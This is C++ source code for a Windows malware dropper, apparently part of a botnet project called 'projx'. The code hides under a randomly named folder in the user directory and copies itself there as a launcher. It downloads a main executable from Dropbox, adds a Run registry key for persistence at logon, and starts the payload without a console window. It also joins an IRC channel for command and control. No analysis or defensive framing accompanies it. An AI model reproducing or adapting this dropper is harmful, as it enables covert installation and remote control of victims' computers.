#include "stdafx.h"

#include "dropper.h"

#include <native_util.h>
#include <url_helper.h>
#include <px_file.h>

namespace projx {

	Dropper::Dropper() : Client(), fake_path(nullptr), main_prog_path(nullptr), launcher_path(nullptr) {
		std::string current_dir;
		ProgError error = GetModuleDirectory(NULL, &current_dir);
		if (error == ErrorCodes::kSuccess) {
			current_dir = FileFormatPath(current_dir, false);
			std::ifstream fake_prog_file(current_dir + "/" + kFakeProgInfFile);
			if (fake_prog_file.is_open()) {
				fake_prog_file >> fake_prog_name;
				fake_prog_file.close();
			}
			else {
				StrGenRandom("ABCDEFGHIJKLMNOPQRSTUVWXYZ", 3, 5, &fake_prog_name);
			}
		}
	}
	Dropper::~Dropper() {
		if (fake_path) {
			delete fake_path;
			fake_path = nullptr;
		}
		if (main_prog_path) {
			delete main_prog_path;
			main_prog_path = nullptr;
		}
		if (launcher_path) {
			delete launcher_path;
			launcher_path = nullptr;
		}
	}
	Dropper &Dropper::GetInstance() {
		static Dropper instance;
		return instance;
	}
	std::string Dropper::get_fake_prog_name() const {
		return fake_prog_name;
	}
	ProgError Dropper::Start() {
		ProgError error = Client::Start();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		error = UpdateMainProg();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		return ErrorCodes::kSuccess;
	}
	ProgError Dropper::InstallMainProg() {
		if (fake_path || main_prog_path || launcher_path) {
			return ErrorCodes::kInvalidState;
		}
		std::string user_path;
		ProgError error = GetCurrentUserDir(&user_path);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		user_path = FileFormatPath(user_path, false);
		std::string file_path = user_path + "/" + fake_prog_name;
		fake_path = new File(file_path);
		main_prog_path = new File(fake_path->get_path() + "/" + StrToLowercase(fake_prog_name) + ".exe");
		launcher_path = new File(fake_path->get_path() + "/launcher.exe");

		// Downloads the required files:
		error = SHCreateDirectoryEx(NULL, FileFormatPath(fake_path->get_path(), true).c_str(), NULL);
		if (error != ERROR_SUCCESS) {
			return error;
		}
		std::string dropper_path;
		error = GetModulePath(NULL, &dropper_path);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		if (!FileArePathsEqual(dropper_path, launcher_path->get_path())) {
			error = File(dropper_path).CopyTo(launcher_path->get_path());
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
			for (const auto &it : get_downloaded_libs()) {
				std::string lib_filename;
				FileSplitDir(it.first, &lib_filename);
				error = File(it.first).CopyTo(fake_path->get_path() + "/" + lib_filename);
				if (error != ErrorCodes::kSuccess) {
					return error;
				}
			}
		}
		error = get_file_downloader()->DownloadUrl("https://www.dropbox.com/s/0pnz1a0rjsrbdam/projectx-main.exe?dl=1", *main_prog_path);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		std::ofstream fake_prog_inf(fake_path->get_path() + "/" + kFakeProgInfFile, std::fstream::out | std::fstream::trunc);
		if (fake_prog_inf.is_open()) {
			fake_prog_inf << fake_prog_name;
			fake_prog_inf.close();
		}

		HKEY run_handle;
		error = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &run_handle);
		if (error) {
			return error;
		}
		const std::string reg_launcher = FileFormatPath(launcher_path->get_path(), true);
		error = RegSetValueEx(run_handle, (fake_prog_name + "Launcher").c_str(), 0, REG_SZ, (BYTE*)reg_launcher.c_str(), (DWORD)reg_launcher.length() + 1);
		if (error) {
			return error;
		}
		RegCloseKey(run_handle);
		return ErrorCodes::kSuccess;
	}
	File &Dropper::get_fake_path() const {
		return *fake_path;
	}
	ProgError Dropper::UpdateMainProg() {
		// TODO Test all of this.
		std::string current_dir;
		ProgError error = GetModuleDirectory(NULL, &current_dir);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		current_dir = FileFormatPath(current_dir, false);
		static constexpr char *kAssetsVerUrl = "https://www.dropbox.com/s/xfg0bsjxbyllxk9/version.txt?dl=1", *kVerFile = "version.txt";
		if (File(current_dir + "/" + kVerFile).Exists()) {
			UrlDataBuf version_buf;
			error = get_file_downloader()->DownloadUrl(kAssetsVerUrl, &version_buf);
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
			float current_ver = 0.0F;
			std::fstream version_file(current_dir + "/" + kVerFile, std::fstream::in);
			version_file >> current_ver;
			char *ver_data = new char[version_buf.get_data_sz() + 1]{ '\0' };
			if (ver_data == nullptr) {
				version_file.close();
				return ErrorCodes::kOutOfMem;
			}
			memcpy(ver_data, version_buf.get_data(), version_buf.get_data_sz());
			float new_ver = stof(std::string(ver_data));
			version_file.close();
			if (current_ver < new_ver) {
				error = InstallMainProg();
				if (error != ErrorCodes::kSuccess) {
					delete[] ver_data;
					ver_data = nullptr;
					return error;
				}
				version_file.open(current_dir + "/" + kVerFile, std::fstream::out | std::fstream::trunc);
				version_file << new_ver;
				version_file.close();
			}
			else {
				if (fake_path || main_prog_path || launcher_path) {
					error = ErrorCodes::kInvalidState;
				}
				std::string current_path;
				if (error == ErrorCodes::kSuccess) {
					error = GetModulePath(NULL, &current_path);
				}
				if (error != ErrorCodes::kSuccess) {
					delete[] ver_data;
					ver_data = nullptr;
					return error;
				}
				fake_path = new File(current_dir);
				main_prog_path = new File(fake_path->get_path() + "/" + StrToLowercase(fake_prog_name) + ".exe");
				launcher_path = new File(current_path);
			}
			delete[] ver_data;
			ver_data = nullptr;
		}
		else {
			error = InstallMainProg();
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
			error = get_file_downloader()->DownloadUrl(kAssetsVerUrl, fake_path->get_path() + "/" + kVerFile);
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
		}
		system(("start /b \"\" \"" + main_prog_path->get_path() + "\"").c_str());  // Starts the main program with no console window.
		return ErrorCodes::kSuccess;
	}
	ProgError Dropper::RunFrame() {
		if (!IsRunning()) {
			return ErrorCodes::kInvalidState;
		}
		get_irc()->ReceiveData();
		return ErrorCodes::kSuccess;
	}
	IrcConnectParams Dropper::GetIrcParams() const {
		IrcConnectParams params;
		params.channel = "#PXNET_DROPPER";
		params.host = "chat.freenode.net";
		params.port = 6665;
		return params;
	}
	std::string Dropper::GetLibListUrl() const {
		return "https://www.dropbox.com/s/517b3xooledityb/dropper_libs.txt?dl=1";
	}

}  // namespace projx
